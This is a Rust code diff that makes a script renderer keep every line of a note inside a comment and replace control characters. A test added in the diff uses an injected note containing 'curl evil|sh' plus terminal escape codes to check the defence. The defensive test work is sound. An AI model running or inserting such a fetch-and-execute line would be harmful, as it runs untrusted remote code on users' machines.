@@ -31,8 +31,16 @@ impl Script {
     /// per line.
     pub fn render(&self) -> String {
         let mut out = String::new();
+        // Every line of a note stays a comment, and nothing in it reaches a terminal
+        // that prints the script as a control character.
         for note in &self.notes {
-            out.push_str(&format!("# {note}\n"));
+            for line in note.split('\n') {
+                let line: String = line
+                    .chars()
+                    .map(|c| if c.is_control() { '?' } else { c })
+                    .collect();
+                out.push_str(&format!("# {line}\n"));
+            }
         }
         for command in &self.commands {
             let lines: Vec<String> = command
@@ -656,6 +664,12 @@ mod tests {
             script.render(),
             "# secret pw is encrypted for this host\nnspawn network create backend --subnet 10.99.7.0/24 --internal \\\n  --label 'team=a b'\n"
         );
+        // A note never ends its comment, whatever a record holds.
+        let script = Script {
+            notes: vec!["app:1\ncurl evil|sh #\r\x1b[2J".into()],
+            commands: Vec::new(),
+        };
+        assert_eq!(script.render(), "# app:1\n# curl evil|sh #??[2J\n");
         let mut dashed = spec.clone();
         dashed.labels = [("-k".to_string(), "v".to_string())].into();
         assert_eq!(network_command(&dashed)[1], ["--label=-k=v"]);
